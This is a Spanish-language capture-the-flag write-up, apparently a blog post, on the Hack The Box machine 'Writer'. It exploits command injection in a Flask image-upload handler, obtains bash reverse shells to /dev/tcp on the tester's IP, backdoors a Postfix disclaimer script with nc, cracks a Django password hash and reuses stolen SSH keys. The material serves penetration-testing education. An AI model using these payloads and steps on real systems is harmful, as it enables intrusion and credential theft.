üêç ***`WSGI` son las siglas de Web Server Gateway Interface. Es una especificaci√≥n que describe <u>c√≥mo se comunica un servidor web con una aplicaci√≥n web</u>, y c√≥mo se pueden llegar a encadenar diferentes aplicaciones web para procesar una solicitud/petici√≥n (o request).*** [¬øQu√© es un WSGI?](https://medium.com/@nachoad/que-es-wsgi-be7359c6e001)

Veamos el objeto `/var/www/writer.htb/writer.wsgi`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361bash_sqliPY_loadFile_writerWSGI.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

> Ac√° estube bastante perdido un tiempo por no prestar atenci√≥n y no leer bien :P Gracias [7Rocky](https://app.hackthebox.eu/profile/532274) por aclararme las ideas (:

Algunas cositas llamativas para nuestra vista y pensamiento, pero la √∫nica que nos puede llegar a ayudar es esta l√≠nea:

üêç ***# Import the __init__.py from the app folder***

Nos habla del objeto `__init__.py` y que esta siendo importado desde el directorio de la aplicaci√≥n web, pues lo siguiente seria intentar encontrar ese archivo a ver que contiene... Jugando con las rutas anteriormente encontradas, encontramos el objeto en esta:

```bash
/var/www/writer.htb/writer/__init__.py
```

El archivo es gigaaaaaaante, as√≠ que se los dejo ac√° por si le quieren echar un ojo:

> [/var/www/writer.htb/writer/__init__.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/writer/__init__.py)

El objeto es el encargado de toodo el **blog**, as√≠ que podemos ver como funciona por detr√°s cada apartado üòÆ

Despu√©s de un recorrido por todo el c√≥digo, podemos destacar inicialmente la contrase√±a del usuario `admin` en la base de datos:

```py
...
connector = mysql.connector.connect(user='admin', password='ToughPasswordToCrack', host='127.0.0.1', database='writer')
...
```

...

## Encontramos posible <u>command-injection</u> [üìå](#web-command-injection) {#web-command-injection}

‚ö†Ô∏è‚ù§Ô∏è‚ö†Ô∏è **<span style="color:red;">ANUNCIO</span>: <span style="color:yellow;">Si quieres evitar tooooooda la explicaci√≥n del c√≥digo y como encontramos el command-injection, sigue</span> [<u>este link</u>](#web-command-injection-revsh)** ‚ö†Ô∏è‚ù§Ô∏è‚ö†Ô∏è 

Tambi√©n hay cositas interesantes tanto en la funci√≥n `add_story()` como en `edit_story()`, enfoqu√©monos en `edit_story()`, as√≠ evitamos generar ruido e historias basura :P

> [/var/www/writer.htb/writer/__init__.py - edit_story()](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/writer/__init__.py#L142)

**Voy a intentar no enredarlos y extenderme tanto, ya que puede ser "medio" confuso (realmente no, el confuso seria yo :P)**

> Extraemos cositas clave de toooda la funcion, sin embargo ya saben, arriba esta el codigo completo...

Recuerdan que al inicio encontramos la parte de editar las historias, sus t√≠tulos e im√°genes, incluso que pod√≠amos subir una imagen desde una **URL**, pues ac√° tenemos el c√≥mo se generan esas opciones en el backend yyyyyyyy es muy interesante:

```py
...
@app.route('/dashboard/stories/edit/<id>', methods=['GET', 'POST'])¬∑
def edit_story(id):
...
    if request.files['image']:           # Ac√° valida que el parametro de la petici√≥n 'images' tenga info, si es as√≠:
        image = request.files['image']   # La guarda en la variable 'image'
        if ".jpg" in image.filename:     # Si esa imagen en su nombre (image.filename) contiene '.jpg' podemos seguir (IMPORTANTE)
            ...
            # Agrega a la ruta '/var/.../' el nombre del archivo (image.filename). 
            # - e.g: 'image.filename=hola.jpg' -> path = '/var/.../img/hola.jpg'
            path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)  
            ...
            # Simplemente concatena carpeta con nombre de archivo, e.g: '/img/hola.jpg'
            image = "/img/{}".format(image.filename)
            ...
            # Guarda en la base de datos el valor de 'image', e.g: '/img/hola.jpg'
            cursor.execute("UPDATE stories SET image = %(image)s WHERE id = %(id)s", {'image':image, 'id':id})
            # (SIN NING√öN TIPO DE VALIDACI√ìN IMPORTANTE, √∫nicamente que contenga '.jpg', INTERESANTEEEEEEE)
            ...
    if request.form.get('image_url'):               # Ac√° valida que el parametro 'image_url' tenga contenido, si s√≠:
        image_url = request.form.get('image_url')   # Guarda la URL completa en 'image_url'
        if ".jpg" in image_url:                     # Lo mismo, si la URL contiene '.jpg' podemos continuar
            try:
                ...
                # Ahora hace una peticion contra la URL primero para validar que el archivo exista y guardar el contenido en un archivo temporal
                local_filename, headers = urllib.request.urlretrieve(image_url)
                ...
                # OJO: Interactua con un comando del sistema ('mv') para tomar el archivo temporal y agregarle al final la cadena '.jpg'
                os.system("mv {} {}.jpg".format(local_filename, local_filename))
                # Esto es muuuuuy llamativo por que podemos pensar en un COMMAND INJECTION, ¬øpor que? Veamos:
                # (Claramente no sabemos a√∫n que guarda 'local_filename' (ya probaremos), pero podemos imaginar algo as√≠)
                # - Ya que si tenemos el nombre de archivo 'hola.jpg' peeero lo modificamos a algo como:
                # - hola.jpg; ping 10.10.14.157;
                # >>> os.system("mv hola.jpg; ping 10.10.14.157; ...")
                # Y si todo va bien, deberia la m√°quina enviarnos una traza ICMP (ping) contra nuestra direccion IP :o
                ...
                # Guarda en la variable 'image' el nombre del archivo temporal y le agrega '.jpg'
                image = "{}.jpg".format(local_filename)
                ...
                try:
                    # Toma el nombre de la imagen ('image') y la intenta abrir para validar que sea una imagen
                    im = Image.open(image) 
                    ...
                    # Ac√° nos da un indicio de como se guarda el archivo ('local_filename').
                    image = image.replace('/tmp/','')
                    # - Ya que remplaza de 'image' la string '/tmp/' por '' (vacio)
                    # - Por lo que si 'local_filename' es igual a '/tmp/hola.jpg', 'image' quedaria con el valor 'hola.jpg'
                    ...
                    # Volvemos a encontrarnos una interaccion con el sistema y a pensar en un COMMAND INJECTION.
                    os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
                    # Peeero claro, si arriba habia un COMMAND INJECTION, ya deberiamos haber ejecutado algo y no esperar hasta llegar a ac√°.
                    # Sin embargo podemos tenerlo en mente por si algo...
                    ...
                    # Y actualiza la DB con el nombre del archivo (lo mismo que vimos antes)
                    image = "/img/{}".format(image)
                    cursor.execute("UPDATE stories SET image = %(image)s WHERE id = %(id)s", {'image':image, 'id':id})
                    ...
...
```

Bien, despu√©s de la exploraci√≥n profunda por el c√≥digo (espero no haberlos confundido mucho :P) salimos bastante contentos de encontrar un posible **COMMAND INJECTION**, que si no sabes que es, es tal cual su nombre, una inyecci√≥n de comandos :P, aprovechamos instrucciones que est√°n ejecutando comandos del sistema, tomando ya sean **variables** o procesos con los que un usuario interact√∫a, la explotaci√≥n se da cuando el user quiere -interactuar- de manera juguetona para adem√°s de ejecutar los comandos por default de la app, **ejecutar** los que √©l quiera, por ejemplo para obtener una **Reverse Shell**.

* [Command Injection](https://www.imperva.com/learn/application-security/command-injection/).
* [OWASP - Command Injection](https://owasp.org/www-community/attacks/Command_Injection).

Como prueba simul√© el `if` de `image_url`, ya que el de `image` fue f√°cil ver que hacia...

Generamos un script r√°pidongo:

```bash
#!/usr/bin/python3

from flask import Flask, session, redirect, url_for, request, render_template
import urllib.request

url_host = "http://10.10.14.157:8000/"
filename_image = "hola.jpg"
image_url = url_host + filename_image

if ".jpg" in image_url:
    try:
        # Hacemos la petici√≥n
        local_filename, headers = urllib.request.urlretrieve(image_url)
        # Simulamos que movemos el archivo, √∫nicamente para ver que valor toma 'local_filename'
        print("mv {} {}.jpg".format(local_filename, local_filename))
        # Vemos el nombre final de la imagen
        image = "{}.jpg".format(local_filename)
        print(image)
    except:
        # Alg√∫n error (lo √∫nico que podria generarlo ser√≠a la petici√≥n), cae ac√°
        print("f - error en la petici√≥n")
```

Levantamos servidor web en el puerto `8000`:

```bash
‚ù± python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Creamos archivo llamado `hola.jpg`: `touch hola.jpg`.

Y ahora simplemente ejecutar√≠amos el script:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361bash_commandinjectionPY_req_http_holaJPG.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Bien, efectivamente se genera un archivo temporal, pero cambia completamente, por lo que si intent√°ramos un **command-injection** ¬øtambi√©n cambiaria el nombre, pero aun as√≠ lograr√≠amos que interpretara algo? ¬øqu√© dices?

```py
...
filename_image = "hola.jpg;ping 10.10.14.157;"
...
```

```bash
‚ù± touch 'hola.jpg;ping 10.10.14.157;'
```

Yyyy ahora ejecutamos de nuevo el script:

```bash
‚ù± python3 command_imajection.py
f - error en la petici√≥n
```

Pero ni llega la petici√≥n :P 

Intentando cosas como `hola.jpg;'ping...';` o `hola.jpg;$(ping...);` tampoco logramos recibir la petici√≥n (da igual si el archivo existe o no, deber√≠a llegar un `404 Not Found`), as√≠ que F...

Despu√©s de un bueeeeen rato intentando e intentando se me ocurri√≥ (y el nombre `local_filename` ayudo a reforzar la idea) que podr√≠amos intentar hacer una petici√≥n a alguna imagen local (del sistema), para hacerlo podemos usar los [wrappers](https://www.php.net/manual/es/wrappers.php), en concreto con el wrapper `file://`:

```bash
file:// ‚Äî Acceso al sistema de ficheros local
http:// ‚Äî Acceso a URLS en HTTP(s)
```

* [Manual de PHP - wrappers](https://www.php.net/manual/es/wrappers.php)

Entonces, la prueba inicial del wrapper en nuestro sistema ser√≠a:

```py
...
url2image = "file://"
image = "/root/writer/scripts/hola.jpg"
...
```

Ejecutamos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361bash_commandinjectionPY_res_WRAPPERfile_holaJPG.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

OPAAAAAAAAAAAAaaaslwalkajsfl, toma el nombre el archivo reaaaaaaaAAALaaaAAAAlLll

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361google_gif_boiHYPEboy.gif" style="display: block; margin-left: auto; margin-right: auto; width: 60%;"/>

Intentemos de alguna forma hacer que lea el archivo, peeeero a la vez generar un **command-injection, ya que ahora S√ç tenemos control sobre el nombre del objeto :)

```py
...
url2image = "file://"
image = "/root/writer/scripts/hola.jpg;ping 10.10.14.157;"
...
```

```bash
‚ù± touch 'hola.jpg;ping 10.10.14.157;'
```

Ejecutamos para probar si genera la petici√≥n:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361bash_commandinjectionPY_res_WRAPPERfile_holaJPGwithPING_print.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

PERRRRRRRFECTO, se hace la petici√≥√≥√≥√≥√≥√≥√≥√≥nnnn, pues ejecutamos realmente la l√≠nea `os.system(...)` a ver si obtenemos el `ping`:

Nos ponemos en escucha por la interfaz donde esta la VPN de HTB capturando todos los paquetes **ICMP** (son las trazas enviadas por el comando `ping`) que le lleguen:

```bash
‚ù± tcpdump -i tun0 icmp
```

Y en el script:

```py
...
os.system("mv {} {}.jpg".format(local_filename, local_filename))
...
```

Ejecutamos yyyyyyyyyyyyyyyyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361bash_commandinjectionPY_res_WRAPPERfile_holaJPGwithPING_execute.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

VAMOOOOOOOOOOOOOOOOOOOOOOOOOOO, las trazas son enviadas y las vemos desde el propio script (al ser local), as√≠ que confirmamos el `command-injection` y llego el momento de replicar esto, pero directamente en el blog (: Ser√© r√°pido y directo, igual tooooda la explicaci√≥n se hizo de ac√° pa arriba.

...

## Explotamos <u>command-injection</u> y generamos Shell [üìå](#web-command-injection-revsh) {#web-command-injection-revsh}

Pasos muuuy sencillos:

1. Necesitamos primero crear/modificar un archivo en el sistema para que en su nombre tenga nuestro payload.
2. Usar el wrapper `file://` para referenciar ese archivo. (podemos hacer este y el primero al tiempo, pero la idea es que entiendan que hago)

...

### Editamos historia y colocamos nuestro payload como nombre de la imagen [‚öôÔ∏è](#web-command-injection-revsh-editimage) {#web-command-injection-revsh-editimage}

Bypasseamos el panel-login, vemos las historias y seleccionamos cualquiera de las que existen, tomar√© la segunda:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361page80_stories_2.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Clic en el **l√°piz** y llegamos a ac√°:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361page80_stories_edit2.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Ahora, vamos a apoyarnos de `BurpSuite` para mostrar claramente la explotaci√≥n.

Activamos el proxy y en la p√°gina web damos clic en `Send`, nos llegar√≠a la petici√≥n a **Burp**, damos ya sea: 

* Clic derecho en la petici√≥n > `Send to repeater` o
* `CTRL+R`, apagamos el **intercept** y listos, as√≠ evitamos estar activando y desactivando el proxy.

Tenemos esto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361burp_stories_edit2_normal.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Como vemos, ah√≠ est√°n los dos campos interesantes que desbaratamos antes: `image` e `image_url`.

Apoyados en el script que creamos para dumpear las bases de datos podemos ver el valor actual de la imagen para la historia `2`:

```bash
‚ù± python3 plaYsQLi.py --query writer stories id,title,image
[*] Dumpeando id,title,image de writer.stories

...
[+] 2-Autumn Rain-/img/rain.jpg
...
```

Recordemos que el backend lo √∫nico que v√°lida es que lo que sea que pongamos como imagen tenga en su nombre un `.jpg`, as√≠ que en teor√≠a deber√≠a ser modificado su nombre sin problemas, intentemos el payload para una **Reverse Shell**, que simplemente env√≠a al puerto (en mi caso) `4433` de la direcci√≥n IP `10.10.14.157` una `bash (/bin/bash)`, o sea un Shell (:

```bash
‚ù± echo "bash -i >& /dev/tcp/10.10.14.157/4433 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNTcvNDQzMyAwPiYxCg==
```

```bash
hola.jpg;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNTcvNDQzMyAwPiYxCg==|base64 -d|bash;
```

La encodeamos en `base64` para que viaje sin problemas, el sistema debe decodearda (`base64 -d`) e interpretarla (`bash`):

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361burp_stories_edit2_imageWITHrevsh.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Enviamos la petici√≥n (dando clic en `Send` arriba a la izq) yyyy ahora volvemos a validar en la base de datos:

```py
 python3 plaYsQLi.py --query writer stories id,title,image
[*] Dumpeando id,title,image de writer.stories

...
[+] 2-Autumn Rain-/img/hola.jpg;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNTcvNDQzMyAwPiYxCg==|base64 -d|bash;
...
```

**Perfect√≠simo, tenemos nuestro primer paso.**

### Jugamos con el wrapper <u>file://</u> para que nuestro payload sea interpretado [‚öôÔ∏è](#web-command-injection-revsh-editimage-wrapper) {#web-command-injection-revsh-editimage-wrapper}

Lo √∫nico que falta es referenciar esa imagen, en el c√≥digo vimos que la imagen es guardada en una ruta especifica:

```py
...
path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)
image.save(path)
...
```

As√≠ que el wrapper quedar√≠a as√≠:

```html
file:///var/www/writer.htb/writer/static/img/hola.jpg;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNTcvNDQzMyAwPiYxCg==|base64 -d|bash;
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361burp_stories_edit2_imageWITHrevshYwrapper.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Nos ponemos en escucha por el puerto `4433`:

```bash
‚ù± nc -lvp 4433
listening on [any] 4433 ...
```

Enviamos la petici√≥n, la p√°gina parece fallecer, peeeeeeeeero si revisamos nuestro listener:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361bash_wwwdataRevSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

TAMOOOOOOOS DENTROOOOOOOOOOOOOOOOOOOOOOOOOOOO!! üò¨ Bruuuutal la intrusi√≥n...

...

Les dejo este script que automatiza todo el proceso de edici√≥n y obtenci√≥n de Shell.

> [imajection.py](https://github.com/lanzt/lanzt.github.io/blob/main/assets/scripts/HTB/writer/imajection.py)

...

Antes de seguir volvemos nuestra terminal interactiva, as√≠ lograremos movernos entre comandos, tener hist√≥rico de ellos yyyy ejecutar `CTRL+C` sin temor a perder la Shell:

* [https://lanzt.gitbook.io/cheatsheet-pentest/tty](https://lanzt.gitbook.io/cheatsheet-pentest/tty)

Ahora si, a enumerar...

...

# DjangognajD: www-data -> kyle [#](#django) {#django}

Si recordamos (esta m√°quina es mucho de recordar cositas anteriores) hab√≠amos visto un proyecto llamado `writer2_project`, ahora lo vemos claramente tooodo:

```bash
www-data@writer:/var/www$ ls
html  writer.htb  writer2_project
```

Recorriendo los archivos encontramos uno con un nombre llamativo, ¬øcu√°l es?

```bash
www-data@writer:/var/www/writer2_project/writerv2$ ls
__init__.py  __pycache__  settings.py  urls.py  wsgi.py
```

Si lo inspeccionamos con los ojos bien abiertos tenemos este conjunto de l√≠neas casi al final:

```py
...
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql',
        'OPTIONS': {
            'read_default_file': '/etc/mysql/my.cnf',
        },
    }
}
...
```

Un archivo de configuraci√≥n de `mysql`, por curiosidad echamos un ojo sobre √©l yyyyyyyyyyy:

```bash
www-data@writer:/var/www/writer2_project/writerv2$ cat /etc/mysql/my.cnf
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361bash_wwwdataSH_cat_MYSQLmyCNF.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

OPA, unas credenciales para una base de datos distinta a las que ten√≠amos, prob√©moslas:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361bash_wwwdataSH_mysql_devDB.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Son v√°lidas, pues demos vueltas por ah√≠, quiz√°s haya algo interesante y √∫til...

```bash
MariaDB [dev]> show tables;
+----------------------------+
| Tables_in_dev              |
+----------------------------+
| auth_group                 |
| auth_group_permissions     |
| auth_permission            |
| auth_user                  |
| auth_user_groups           |
| auth_user_user_permissions |
| django_admin_log           |
| django_content_type        |
| django_migrations          |
| django_session             |
+----------------------------+
```

La tabla `auth_user` esta llamativa, veamos su contenido:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361bash_wwwdataSH_mysql_devDB_TABLEauthuser.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Un usuario y contrase√±a (hash) del usuario `kyle`, algo curioso es que **kyle** tambi√©n es un usuario del sistema (se acuerdan que lo vimos cuando obtuvimos el contenido de `/etc/passwd`):

```bash
www-data@writer:/var/www/writer2_project/writerv2$ ls /home
john  kyle
```

Se vuelve muuuuy interesante esto, intentemos crackear ese hash... Veamos que tipo es:

* [https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)

Buscamos por hashes que empiecen con `pbkdf2_sha` yyy uno de los resultados concuerda con todo lo encontrado antes:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361google_hashcat_hashesExamples_pbkdf2SHA_DJANGO.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Un hash de [Django](https://www.djangoproject.com/) (framework para desarrollo web), pues a crackeowowowo:

Lo tomamos y guardamos en un archivo, yo lo llamar√© `django_hash.kyle`, con **JohnTheRipper** no logramos siquiera que tome el hash como -hash-, as√≠ que usaremos [hashcat](https://resources.infosecinstitute.com/topic/hashcat-tutorial-beginners/), le debemos pasar el tipo de hash (**hashcat** lo referencia con el ID, ya vimos que es `10000`), el archivo con el hash, un wordlist (para validar cu√°l palabra hace match con ese hash) y adicional una vez (si es que lo hace) crackee el hash, guarde su resultado en un objeto llamado `cracked.txt`:

```bash
‚ù± hashcat -m 10000 django_hash.kyle /usr/share/wordlists/rockyou.txt -o cracked.txt
```

Ejecutamos yyyyyyy pasado un buen rato (recuerden no desesperarse) el hash es crackeadooooooooooooooooooooooooo:

```bash
...
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Django (PBKDF2-SHA256)
Hash.Target......: pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8...uXM4A=
Time.Started.....: Sat Oct  9 25:36:39 2021 (11 mins, 57 secs)
Time.Estimated...: Sat Oct  9 25:48:36 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       13 H/s (20.96ms) @ Accel:32 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 9408/14344385 (0.07%)
Rejected.........: 0/9408 (0.00%)
Restore.Point....: 9376/14344385 (0.07%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:259072-259999
Candidates.#1....: missing -> 120287
...
```

```bash
‚ù± cat cracked.txt 
pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio
```

El hash da como resultado en texto plano a `marcoantonio`, con lo cual esa ser√≠a su contrase√±a para el aplicativo web con `Django`, peeeeero ¬øpodr√≠a ser para otro servicio? ¬øQuiz√°s para el sistema? Probemos reutilizaci√≥n de contrase√±as:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361bash_kyleSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Y s√≠, obtenemos la Shell como `kyle` (: Aprovechemos que contamos con `SSH` para entablar una Shell ah√≠ y seguir nuestro camino caminando:

```bash
‚ù± ssh kyle@10.10.11.101
```

...

# Avisos legales : kyle -> john [#](#disclaimer) {#disclaimer}

Estando dentro de primeras vemos algo interesante en los grupos donde esta `kyle`:

```bash
kyle@writer:~$ id
uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup)
```

Hay dos grupos llamativos: `filter` y `smbgroup`, exploremos primero `filter`. Busquemos si hay objetos en tooooooodo el sistema que sean creados o permitan el acceso a usuarios con ese grupo:

```bash
kyle@writer:~$ find / -group filter -ls 2>/dev/null
    16282      4 -rwxrwxr-x   1 root     filter       1021 Oct 14 15:22 /etc/postfix/disclaimer
    16281      4 drwxr-x---   2 filter   filter       4096 May 13 22:31 /var/spool/filter
```

Bien, hay dos, inspeccionemos:

üß± **<u>/var/spool/filter</u>**

```bash
kyle@writer:~$ cat /var/spool/filter
cat: /var/spool/filter/: Is a directory
kyle@writer:~$ ls -la /var/spool/filter
total 8
drwxr-x--- 2 filter filter 4096 May 13 22:31 .
drwxr-xr-x 7 root   root   4096 May 18 16:54 ..
```

Nada por aqu√≠...

üß± **<u>/etc/postfix/disclaimer</u>**

Este hace referencia a [Postfix](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-postfix-as-a-send-only-smtp-server-on-ubuntu-18-04-es) que es un servidor de correo de software libre.

```bash
kyle@writer:~$ cat /etc/postfix/disclaimer
#!/bin/sh
# Localize these.
INSPECT_DIR=/var/spool/filter
SENDMAIL=/usr/sbin/sendmail

# Get disclaimer addresses
DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses

# Exit codes from <sysexits.h>
EX_TEMPFAIL=75
EX_UNAVAILABLE=69

# Clean up when done or when aborting.
trap "rm -f in.$$" 0 1 2 3 15

# Start processing.
cd $INSPECT_DIR || { echo $INSPECT_DIR does not exist; exit
$EX_TEMPFAIL; }

cat >in.$$ || { echo Cannot save mail to file; exit $EX_TEMPFAIL; }

# obtain From address
from_address=`grep -m 1 "From:" in.$$ | cut -d "<" -f 2 | cut -d ">" -f 1`

if [ `grep -wi ^${from_address}$ ${DISCLAIMER_ADDRESSES}` ]; then
  /usr/bin/altermime --input=in.$$ \
                   --disclaimer=/etc/postfix/disclaimer.txt \
                   --disclaimer-html=/etc/postfix/disclaimer.txt \
                   --xheader="X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm" || \
                    { echo Message content rejected; exit $EX_UNAVAILABLE; }
fi

$SENDMAIL "$@" <in.$$

exit $?
```

Ojito, un script en bash que automatiza el env√≠o de **avisos legales** (disclaimers) a los mails que sean remitidos desde alguna de las direcciones ac√° listadas:

```bash
DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses
```

```bash
kyle@writer:/etc/postfix$ cat /etc/postfix/disclaimer_addresses
root@writer.htb
kyle@writer.htb
```

Bien, uno de ellos es `kyle`, as√≠ que los correos enviados ya sean desde `root@writer.htb` o `kyle@writer.htb` se les a√±adir√° el disclaimer...

Pero claro, para poder jugar con esto necesitamos un servidor [SMTP](https://es.sendinblue.com/blog/que-es-smtp/) activo, validemos si existe:

```bash
kyle@writer:/etc/postfix$ netstat -l
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
...
tcp        0      0 localhost:smtp          0.0.0.0:*               LISTEN
...
```

Perfecto, la idea es que si cada vez que se env√≠a un correo, por ejemplo a `kyle`, ira a ese binario, <u>lo ejecutara</u> y agregara el **disclaimer**, pues podemos simplemente pensar en agregar una l√≠nea -maliciosa- que en teor√≠a deber√≠a ser ejecutada ¬øno?

**Peeeeero claro**, si logramos ejecuci√≥n de comandos, como quien lo har√≠amos ¬øc√≥mo `kyle`? En ese caso no nos servir√≠a de nada, ya que actualmente somos `kyle` :( Si nos movemos a `/etc/postfix` tenemos varios objetos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361bash_kyleSH_ls_etcPostfix.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Recorriendo algunos, caemos en `master.cf` y una l√≠nea final baaaastante llamativa:

```bash
kyle@writer:/etc/postfix$ cat master.cf
...
  flags=Rq user=john argv=/etc/postfix/disclaimer -f ${sender} -- ${recipient}
```

Vemos el binario y un usuario llamado `john`, queeeeeeeeeee curiosamente tambi√©n es uno del sistema. ¬øSer√° que `john` es el que ejecuta el disclaimer? Por lo que √©l ser√≠a el que ejecutar√≠a nuestro comando malicioso... Esa teor√≠a nos la confirma este post:

* [How To Automatically Add A Disclaimer To Outgoing Emails With alterMIME](https://www.howtoforge.com/how-to-automatically-add-a-disclaimer-to-outgoing-emails-with-altermime-postfix-on-debian-squeeze).

> Que tooooooodo el proceso es exactamente igual, lo unico que cambia es el usuario.

As√≠ que ahora si intentemos cositas, modifiquemos el archivo para que una vez sea ejecutado nos env√≠e (a un puerto donde estaremos escuchando) el `id` del usuario que ejecuta el **disclaimer** (deber√≠a ser `john`), el objeto quedar√≠a as√≠:

> La IP me cambio por un problema que tuve con la VPN :P

```bash
kyle@writer:/etc/postfix$ cat disclaimer
#!/bin/sh
...
id | nc 10.10.14.6 4433
...
```

> El archivo es regenerado cada 2 minutos, as√≠ que hay que correeeeeeer (o automatizar todo (tarea pa la casita))

Sencillito, ahora pong√°monos en escucha sobre ese puerto en nuestra m√°quina: `nc -lvp 4433`.

Y solo nos quedar√≠a enviar el mail, usar√© `telnet`:

* [5 Ways to Send Email From Linux Command Line](https://tecadmin.net/ways-to-send-email-from-linux-command-line/).

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361bash_kyleSH_telnet_sendMail.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Al parecer no funciona, peeeeeeeeeero si esperamos unos segundoooooooooooooooooooos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361bash_nc_idJOHN_fromDisclaimer.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Peee eee eeerrrr feccctooooo, tenemos ejecuci√≥n remota de comandos como el usuario `john`, obtengamos una **Shell**:

```bash
‚ù± echo "bash -i >& /dev/tcp/10.10.14.6/4433 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MzMgMD4mMQo=
```

```bash
kyle@writer:/etc/postfix$ cat disclaimer
#!/bin/sh
...
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MzMgMD4mMQo= | base64 -d | bash
...
```

```bash
‚ù± nc -lvp 4433
listening on [any] 4433 ...
```

```bash
kyle@writer:/etc/postfix$ telnet localhost smtp
...
# Enviamos mail
```

Yyyyyyyyyyyyyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361bash_johnRevSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Si si si, tamos como el usuario `john` dentro del sistemaaaaaaaaaa (: Hagamos [tratamiento del TTY](https://lanzt.gitbook.io/cheatsheet-pentest/tty) y veamos con que nos encontramos ahora...

...

Recorriendo el directorio `/home/john` tenemos la carpeta `.ssh` y dentro su llave privada (`id_rsa`):

```bash
john@writer:/home/john/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub
```

Pues recordemos que una llave privada es como una contrase√±a, as√≠ que tom√©mosla, nos la llevamos a nuestro sistema, le damos los permisos necesarios (`chmod 600 <file>`) e intentamos obtener una Shell por **SSH** como `john`:

```bash
‚ù± ssh john@10.10.11.101 -i john.rsa
```

Y efectivamente, obtenemos una Shell (:

...

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Revisando los grupos en los que esta `john` notamos uno claramente distinto y llamativo:

```bash
john@writer:~$ id
uid=1001(john) gid=1001(john) groups=1001(john),1003(management)
```

Pues volvemos a hacer lo que hicimos con `kyle`, busquemos objetos relacionados con ese grupo:

```bash
john@writer:~$ find / -group management 2>/dev/null
/etc/apt/apt.conf.d
```

